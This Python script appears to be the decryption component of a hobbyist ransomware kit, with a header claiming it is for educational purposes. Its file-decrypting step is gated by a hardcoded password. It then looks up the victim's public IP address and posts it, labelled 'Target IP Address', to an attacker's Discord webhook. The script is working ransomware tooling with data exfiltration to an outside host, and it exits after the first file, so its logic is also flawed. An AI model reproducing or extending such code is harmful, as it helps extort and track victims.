#!usr/bin/env python3

######################################################
# Copy Right to ~> Security On PePs & Team           #
# Follow Me on Github ~> https://github.com/ajdev05/ #
# Discord ~> https://discord.gg/KBSQyjWVzG           #
# *Only for testing and educational Purposes*        #
######################################################


import os
from cryptography.fernet import Fernet
import time
import requests
from requests import get
import datetime
os.system("clear") 
files=[]

for file in os.listdir():
    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt": ### Main files that are going to be created 'enkey.key' 'and decrypt.txt'.
        continue
    if os.path.isfile(file):
            files.append(file)


with open("enkey.key","rb") as key:
    seckey=key.read()

user=input("Enter the password to Decrypt your files: ")
if user == "hello": ### change this password.
    for file in files:
        with open(file, "rb") as thefile:
            cont=thefile.read()
        cont_dc = Fernet(seckey).decrypt(cont)
        with open(file,"wb") as thefile:
            thefile.write(cont_dc)
            try:
                os.remove("enkey.key")
            except:
                continue
         ### Webhook to Discord
            print("Task Sucessful, All files were Decrypted")
            ip=get("https://api.ipify.org").text
            dt = datetime.datetime.now()
            nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
            url = "" ### Your Discord Webhook Goes here, inside the Quotes.
            
            x = f"""```
Ransom was Decrypted on a Computer!
------------------------------------
Target IP Address ~> {ip} 
------------------------------------
Time ~> {nowt}``` """
            r=requests.post(url, data={"content": x})

            input("ENTER to quit")
            exit()
else:
    print("Task not sucessful! Type the password correctly or read decrypt.txt")
    exit()
